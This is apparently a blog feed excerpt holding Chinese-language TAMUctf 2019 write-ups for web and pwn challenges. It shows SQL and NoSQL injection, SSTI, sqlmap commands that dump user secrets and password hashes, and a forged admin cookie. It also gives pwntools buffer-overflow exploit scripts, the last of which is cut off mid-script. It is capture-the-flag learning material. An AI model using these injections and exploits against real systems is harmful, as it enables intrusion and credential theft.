    <content type="html"><![CDATA[<p>很简单，但是还是把笔记放上来吧。</p><h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>题目：<a href="http://web1.tamuctf.com/" target="_blank" rel="noopener">http://web1.tamuctf.com/</a></p><p>打开是个登录界面，直接SQL注入getflag：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/1.png" alt=""></p><h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><p>题目：<a href="http://web5.tamuctf.com/" target="_blank" rel="noopener">http://web5.tamuctf.com/</a></p><p>打开页面，提示ROBOTS：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/2.png" alt=""></p><p>直接访问robots.txt，内容如下：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/3.png" alt=""></p><p>大致意思就是告诉它有一个Google robots，直接更换UserAgent为googlebot即谷歌爬虫，从而getflag：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/4.png" alt=""></p><h2 id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><p>题目：<a href="http://web7.tamuctf.com/" target="_blank" rel="noopener">http://web7.tamuctf.com/</a></p><p>打开页面，发现有两个按钮，且页面存在大量图片：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/5.png" alt=""></p><p>右键查看源码，发现图片中的alt属性值有蹊跷：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/6.png" alt=""></p><p>找到了一个<code>gigem{flag_in_</code>字符串，退出剩下的应该在其他页面中找到。</p><p>点击Gigs!按钮时当前主页面，点击Cookies!跳转到cookies.html页面，该页面也存在大量图片，同理查看源码：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/7.png" alt=""></p><p>发现如下可以字符串：<code>gigem{_continued=source_and_</code>。</p><p>最后，根据cookies提示，查看报文的cookie值，其中有个cookies.js设置cookie值，看到其中关联的字符串<code>gigem_continue=cookies}</code>：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/8.png" alt=""></p><p>一切清晰了，拼起来就是<code>gigem{flag_in_source_and_cookies}</code>，这就是flag。</p><h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><p>题目：<a href="http://web3.tamuctf.com/" target="_blank" rel="noopener">http://web3.tamuctf.com/</a></p><p>访问题目，提示是Python Flask搭建的Web服务，其中可以输入内容查询，推测是SSTI即服务端模板注入攻击：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/9.png" alt=""></p><p>验证一下，在其中一个输入框输入<code>579</code>，结果返回了该表达式执行的结果，证明了存在SSTI漏洞：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/10.png" alt=""></p><p>接着上任意文件读取payload即可：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/11.png" alt=""></p><h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><p>题目：<a href="http://tamuctf.s3-website-us-west-2.amazonaws.com/" target="_blank" rel="noopener">http://tamuctf.s3-website-us-west-2.amazonaws.com/</a></p><p>访问网页，说狗肯定比猫好，背景是狗的图片，除此之外没啥了：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/12.png" alt=""></p><p>查看页面源码，有两段提示，大概说的是这是作者第一个AWS Web页面，用的是S3 buckets框架，且passowrd在Dogs附近：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/13.png" alt=""></p><p>这里涉及到AWS S3 buckets框架的一个知识点，就是访问<code>http://tamuctf.s3-website-us-west-2.amazonaws.com/</code>，也可以通过访问<code>http://tamuctf.s3.amazonaws.com/</code>实现，是一样的。</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/14.png" alt=""></p><p>访问Key标签的URL即可getflag：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/15.png" alt=""></p><h2 id="Login-App"><a href="#Login-App" class="headerlink" title="Login App"></a>Login App</h2><p>题目：<a href="http://web4.tamuctf.com/" target="_blank" rel="noopener">http://web4.tamuctf.com/</a></p><p>访问页面，是个提供输入用户名和密码的登录界面，但是怎么输入都没有反应，查看页面源码，关键部分如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.form .register-form &#123;</span><br><span class="line">display: none;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"register-form"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"password"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"email address"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>create<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"login-form"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"password"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"submit"</span>&gt;</span>login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    $("#submit").on('click', function()&#123;</span></span><br><span class="line"><span class="undefined">        $.ajax(&#123;</span></span><br><span class="line"><span class="undefined">            url: 'login', </span></span><br><span class="line"><span class="undefined">            type : "POST", </span></span><br><span class="line"><span class="undefined">            dataType : 'json', </span></span><br><span class="line"><span class="undefined">            data : JSON.stringify(&#123;"username": $("#username").val(), "password": $("#password").val()&#125;),</span></span><br><span class="line"><span class="undefined">            contentType: 'application/json;charset=UTF-8',</span></span><br><span class="line"><span class="undefined">            success : function(result) &#123;</span></span><br><span class="line"><span class="undefined">                $(".result").html(result);</span></span><br><span class="line"><span class="undefined">                console.log(result);</span></span><br><span class="line"><span class="undefined">                alert(result);</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="undefined">            error: function(xhr, resp, text) &#123;</span></span><br><span class="line"><span class="undefined">                $(".result").html("Something went wrong"); </span></span><br><span class="line"><span class="undefined">                console.log(xhr, resp, text);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>虽然在页面中隐藏了注册表单，但是没啥用，因为后面的JS代码只会在id为submit的元素被点击时触发，而只有登录的表单含有该id元素；注意到JS代码的作用，它以POST方法请求的是/login，以Json格式上传username和password参数，Content-Type设置为application/json，构造报文尝试一下：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/16.png" alt=""></p><p>成功返回数据。这里看到登录的参数是通过Json格式提交的，可以推测是一道NoSQL注入题目。</p><p>这里尝试使用$ne即not equal不相等，用来查询某个记录不等于该值的所有记录。</p><p>我们知道密码不为空，参考网上的NoSQL注入payload，那我们就直接输入payload如下就getflag了：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/17.png" alt=""></p><h2 id="Bird-Box-Challenge"><a href="#Bird-Box-Challenge" class="headerlink" title="Bird Box Challenge"></a>Bird Box Challenge</h2><p>题目：<a href="http://web2.tamuctf.com/" target="_blank" rel="noopener">http://web2.tamuctf.com/</a></p><p>提示了：We’ve got Aggies, Trucks, and Eggs!</p><p>访问网页，是一个提供输入的查询页面：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/18.png" alt=""></p><p>随便输入，会找不到东西，但是输入提示的内容就会显示相应的东西：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/19.png" alt=""></p><p><img src="/2019/03/09/TAMUctf-Web-writeup/20.png" alt=""></p><p>关注到页面并没有其他的功能点了，抓包也确认了确实只有Search.php的Search参数存在注入点，且页面没有直接返回错误信息，猜测应该就是SQL盲注吧，且在抓包过程发现，输入eggs即正常数据以及输入查询不到的数据，服务端都是返回500，但其他出错查询时就返回400：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/21.png" alt=""></p><p><img src="/2019/03/09/TAMUctf-Web-writeup/22.png" alt=""></p><p>下面就上sqlmap跑起来，但是一开始没有跑出啥东西，经过测试发现是校验了UserAgent，后台对UserAgent为sqlmap的报文进行了过滤，而sqlmap默认的UA即包含sqlmap字样：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/23.png" alt=""></p><p>sqlmap中先加入–random-agent，跑出为mysql，然后–dbs参数跑出两个数据库，当然可以添加–technique=BT指定基于布尔和时间的盲注来提高效率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --dbs</span><br><span class="line">...</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] SqliDB</span><br></pre></td></tr></table></figure><p>然后-D参数指定SqliDB数据库，–tables参数跑出表Search：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB --tables</span><br><span class="line">...</span><br><span class="line">Database: SqliDB</span><br><span class="line">[1 table]</span><br><span class="line">+--------+</span><br><span class="line">| Search |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>-T参数指定Search表，–columns参数跑出表项items：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --columns</span><br><span class="line">...</span><br><span class="line">Database: SqliDB</span><br><span class="line">Table: Search</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| items  | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure><p>–dump参数将表项的内容全列出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --dump</span><br><span class="line">...</span><br><span class="line">Database: SqliDB</span><br><span class="line">Table: Search</span><br><span class="line">[3 entries]</span><br><span class="line">+--------+</span><br><span class="line">| items  |</span><br><span class="line">+--------+</span><br><span class="line">| Aggies |</span><br><span class="line">| Eggs   |</span><br><span class="line">| Trucks |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>发现是提示的几个内容，也就是说数据库只保存了这几个东西，flag并不在此。</p><p>–users参数查询一下所有用户，发现有且仅有一个的用户名就是flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --users</span><br><span class="line">...</span><br><span class="line">database management system users [1]:</span><br><span class="line">[*] &apos;gigem&#123;w3_4r3_th3_4ggi3s&#125;&apos;@&apos;localhost&apos;</span><br></pre></td></tr></table></figure><h2 id="1337-Secur1ty"><a href="#1337-Secur1ty" class="headerlink" title="1337 Secur1ty"></a>1337 Secur1ty</h2><p>题目：<a href="http://web6.tamuctf.com/" target="_blank" rel="noopener">http://web6.tamuctf.com/</a></p><p>访问页面，有个登录窗口和注册窗口：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/24.png" alt=""></p><p><img src="/2019/03/09/TAMUctf-Web-writeup/29.png" alt=""></p><p>在注册的响应报文中，发现设置cookie的信息：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/28.png" alt=""></p><p>注册完成后，有3个页面如下：</p><p>Profile中显示个人注册信息，并且可以修改：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/25.png" alt=""></p><p>Messages中显示收到的消息，并且可以写新消息发送给别人：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/26.png" alt=""></p><p>Employees中可以看到所有注册的人的消息：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/27.png" alt=""></p><p>从这里可以分析得出，Alan是我注册的用户，这里ID为5，和cookie中userid为5是对应的，也就是说，1337-admin的userid为1，还需要知道它的cookie中secret的属性值才能登上admin的用户来访问。</p><p>现在问题转变为，如何获取secret呢？界面功能有限，一个个点，抓包观察，发现Messages的消息列表可以点进去，且似乎有个id参数注入点：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/30.png" alt=""></p><p>直接丢到sqlmap，发现id参数确实可注入。接着添加sqlmap其他参数让它自己表演就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql --dbs</span><br><span class="line">...</span><br><span class="line">available databases [2]:     </span><br><span class="line">[*] 1337_Secur1ty</span><br><span class="line">[*] information_schema</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty --tables</span><br><span class="line">...</span><br><span class="line">Database: 1337_Secur1ty</span><br><span class="line">[2 tables]</span><br><span class="line">+----------+</span><br><span class="line">| Messages |</span><br><span class="line">| Users    |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --columns</span><br><span class="line">...</span><br><span class="line">Database: 1337_Secur1ty</span><br><span class="line">Table: Users</span><br><span class="line">[10 columns]</span><br><span class="line">+-------------+--------------+</span><br><span class="line">| Column      | Type         |</span><br><span class="line">+-------------+--------------+</span><br><span class="line">| CreateDate  | datetime     |</span><br><span class="line">| Description | varchar(200) |</span><br><span class="line">| Email       | varchar(37)  |</span><br><span class="line">| FirstName   | varchar(10)  |</span><br><span class="line">| LastName    | varchar(15)  |</span><br><span class="line">| Password    | varchar(50)  |</span><br><span class="line">| Phone       | varchar(10)  |</span><br><span class="line">| Secret      | varchar(50)  |</span><br><span class="line">| UserID      | int(9)       |</span><br><span class="line">| Username    | varchar(20)  |</span><br><span class="line">+-------------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --dump</span><br><span class="line">...</span><br><span class="line">Database: 1337_Secur1ty</span><br><span class="line">Table: Users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+</span><br><span class="line">| UserID | Phone   | Email                       | Secret           | Username   | LastName | Password                         | FirstName | CreateDate          | Description                                |</span><br><span class="line">+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+</span><br><span class="line">| 1      | &lt;blank&gt; | 1337-admin@l337secur1ty.hak | WIFHXDZ3BOHJMJSC | 1337-admin | Joeson   | 02ca0b0603222a090fe2fbf3ba97d90c | Joe       | 2019-03-10 07:27:46 | Most secure admin to ever grace existence. |</span><br><span class="line">| 2      | &lt;blank&gt; | ScrubLord@l337secur1ty.hak  | 4VCLO52ALSUUO5OM | ScrubLord  | Bobson   | fc8b8be2abe4a79bf6f36eee484c1f08 | Bob       | 2019-03-10 07:27:46 | That random intern.                        |</span><br><span class="line">+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+</span><br></pre></td></tr></table></figure><p>可以看到，通过sqlmap将Users表中的信息dump下来，其中含有1337-admin用户的secret消息即WIFHXDZ3BOHJMJSC。</p><p>现在退出当前用户，带上这段header字段<code>Cookie: userid=1; secret=WIFHXDZ3BOHJMJSC</code>访问即可getflag：</p><p><img src="/2019/03/09/TAMUctf-Web-writeup/31.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很简单，但是还是把笔记放上来吧。&lt;/p&gt;
&lt;h2 id=&quot;Not-Another-SQLi-Challenge&quot;&gt;&lt;a href=&quot;#Not-Another-SQLi-Challenge&quot; class=&quot;headerlink&quot; title=&quot;Not Another SQLi
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf Pwn writeup</title>
    <link href="https://Mi1k7ea.github.com/2019/03/08/TAMUctf-Pwn-writeup/"/>
    <id>https://Mi1k7ea.github.com/2019/03/08/TAMUctf-Pwn-writeup/</id>
    <published>2019-03-08T14:35:05.000Z</published>
    <updated>2019-03-09T12:40:44.055Z</updated>
    
    <content type="html"><![CDATA[<p>虽然是灰常easy的题，但对我这种刚刚准备入门Pwn的菜鸡来说，再合适不过了。</p><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>题目如下：<a href="https://tamuctf.com/files/b804e1ab7d43ff479292094d9ec64526/pwn1" target="_blank" rel="noopener">pwn1</a></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/10.png" alt=""></p><p>运行程序，功能是询问你名字并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/11.png" alt=""></p><p>打开IDA分析一下，gets()函数明显地存在栈溢出漏洞，且当v5变量等于一个值时便调用print_flag()函数输出flag：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/12.png" alt=""></p><p>右键v5所在的if条件对应的值&gt;Hexadecimal，即可查看到该值的16进制表示为0xDEA110C8，也就是说，当v5的值为该值时，才会进行该逻辑输出flag。</p><p>结合前面的gets()栈溢出，这就很简单了，只需要栈溢出覆盖v5的值为0xDEA110C8，不需要自己去找system(‘/bin/sh’)来getshell了。</p><p>注意的是在溢出之前需要通过两次fgets()输入内容，且内容必须和前两个红框中的字符串一样。也就是说，需要先成功交互前面两个步骤，才会进入最后问你“What… is my secret?”逻辑：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/13.png" alt=""></p><p>计算一下偏移变量s到变量v5的偏移距离，由IDA得s=ebp-3Bh、v5=ebp-10h，则得出下图的结果：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/14.png" alt=""></p><p>一目了然，gets()从s处输入，当输入溢出到v5时即可覆盖该地址。此时偏移量为|(ebp-3Bh)-(ebp-10h)|=2B(h)=43(d)。</p><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>, <span class="number">4321</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"Sir Lancelot of Camelot"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"What... is your quest?"</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"To seek the Holy Grail."</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"What... is my secret?"</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">43</span>, p32(<span class="number">0xDEA110C8</span>)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recvall()</span><br></pre></td></tr></table></figure><p>直接getflag：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/15.png" alt=""></p><h2 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h2><p>题目如下：<a href="https://tamuctf.com/files/fe3b76a986798016f0b868da03a56c79/pwn2" target="_blank" rel="noopener">pwn2</a></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/16.png" alt=""></p><p>运行程序，功能是询问你想调用哪个函数并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/17.png" alt=""></p><p>使用IDA打开查看，gets()函数说明存在明显的栈溢出，下面还存在一个select_func()函数，点进去看到v3变量初始值为two，然后将输入的参数复制31个字节到dest变量中，然后if语句判断当dest变量值为one时将one赋值给v3，最后调用v3()函数：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/18.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/19.png" alt=""></p><p>也就是说，存在one()函数和two()函数，在Functions窗口中可看到它们以及print_flag()函数。点进去看one()函数和two()函数并没有发现代码有什么东西。</p><p>这里注意到，select_func()函数的参数是从前面gets()函数获取的，也就是说，我们通过gets()输入的内容可以赋值给dest变量31个字节的内容。这里观察下这几个函数的地址：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/20.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/21.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/22.png" alt=""></p><p>one()函数地址为0x00000754，two()函数地址为0x000006AD，print_flag()函数地址为0x000006D8。</p><p>观察到，two()函数与print_flag()函数地址相差一个字节，即AD与D8。</p><p>回到前面select_func()函数中可看到，dest变量相对EBP偏移为ebp-2A，v3变量相对EBP偏移为ebp-C，则可知dest与v3之间相对偏移为|(ebp-2A)-(ebp-C)|=1E(h)=30(d)。可以得出如下的栈结构：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/23.png" alt=""></p><p>很清晰了，结合前面可以通过gets()给dest变量赋值31个字节，减去dest与v3之间偏移的20个字节，剩下1个字节可以溢出。而前面分析知道v3变量初始值为two，且two()函数地址和print_flag()函数地址只相差一个字节，那么就可以溢出这一个字节，将v3的初始值0x000006AD溢出为0x000006D8即可。</p><p>注意，两位1十六进制数等同于八位的二进制数，即2^4*2^4=2^8。一个字节=1bytes=8bits=八位二进制数=两位十六进制数。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>, <span class="number">4322</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">30</span>, <span class="string">"\xD8"</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> sh.recvall()</span><br></pre></td></tr></table></figure><p>getflag：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/24.png" alt=""></p><h2 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h2><p>题目如下：<a href="https://tamuctf.com/files/9dc4f5b5523625eb82f2d0de5e16291a/pwn3" target="_blank" rel="noopener">pwn3</a></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/25.png" alt=""></p><p>运行程序，功能是给你一个地址并让你输入内容；该ELF文件是动态链接的；checksec查看发现Canary、NX没有打开，且有RWX即可读写执行的代码段，这里推测应该是一道写shellcode执行的题：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/26.png" alt=""></p><p>使用IDA打开查看，main()函数调用了echo()函数，在echo()函数中输出了变量s的地址，然后调用gets()函数获取输入内容到s中，明显存在栈溢出漏洞：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/27.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/28.png" alt=""></p><p>虽然程序开启了RELRO，但在开始就输出了s变量的地址，这样就可以通过gets()在s处写入shellcode内容，然后接着溢出够12Ah+4即298+4个字节后将获取到的s地址覆盖掉函数返回地址、使程序跳转至s处执行shellcode：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/29.png" alt=""></p><p>主要分两步，第1步往s写入shellcode并溢出至函数返回地址处；第2步是用s地址覆盖函数返回地址从而跳转至s处执行shellcode。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>,<span class="number">4323</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Take this, you might need it on your journey 0x"</span>)</span><br><span class="line">addr = 